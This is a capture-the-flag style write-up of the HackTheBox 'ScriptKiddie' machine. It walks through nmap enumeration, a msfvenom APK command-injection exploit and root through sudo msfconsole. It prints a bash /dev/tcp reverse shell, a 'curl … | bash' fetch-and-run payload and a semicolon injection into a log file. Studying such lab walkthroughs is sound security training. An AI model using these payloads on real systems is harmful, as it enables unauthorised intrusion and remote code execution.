---
title: "HackTheBox - ScriptKiddie"
author: Nasrallah
description: ""
date: 2023-01-29 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cve, commandinjection, sudo, msfvenom]
img_path: /assets/img/hackthebox/machines/scriptkiddie
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing **ScriptKiddie** from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.226
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

there are two open ports, port 22 running OpenSSh and port 80 running Werkzeug http webserver with python 3.8.5

## Web

Let's check the web page.

![](1.png)

Here we see this hacker has setup this web page to run nmap scans, generate payloads with msfvenom and search for exploits with searchsploit.

The forms in this page are not injectable, everything is sanitized.

Looking out for Msfvenom with `searchsploit` we find that it has a command injection vulnerability.

```terminal
$ searchsploit msfvenom
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                       | multiple/local/49491.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

# **Foothold**

Let's copy the exploit to our directory using `searchsploit -m multiple/local/49491.py`.

Inside the the exploit there is a variable called `payload`, which is the command that's going to get executed at the target machine, that we need to change.

I'll first create a shell script that contains a reverse shell, then we host the file on an http server.

```terminal
$ cat shell.sh
bash -i >& /dev/tcp/10.10.17.90/1234 0>&1
```

Then we set the payload value to `'curl 10.10.17.90/shell.sh | bash'` which is going to call for our reverse shell script and pip it to bash.

Now let's generate the malicious apk file.

![](2.png)

Let's go back too the web page and upload the evil.apk file

![](3.png)

Now setup a listener and click generate.

![](4.png)

# **Privilege Escalation**

On pwn's home directory, we find the following shell script.

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```

This script reads the `/home/kid/logs/hackers` file, use `cut` to set the delimiter to `space`, skips the first two fields and reads whatever after that as ip and pass it to a nmap scan.

We can easily inject that by putting our command after the second field.

First we put a semicolon to break out from the nmap scan, then we put the same command we used earlier to get a shell.

```bash
echo 'a a ;curl 10.10.17.90/shell.sh | bash' >> hackers
```

We setup a listener and run the command above.

![](5.png)

We got a shell as pwn, now let's run `sudo -l`

```terminal
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

We can run msfconsole as root.

![](6.png)

Checking that entry on GTFOBins, we see that we can run the following command to get root.

```terminal
sudo msfconsole
msf6 > irb
>> system("/bin/sh")
```

![](7.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).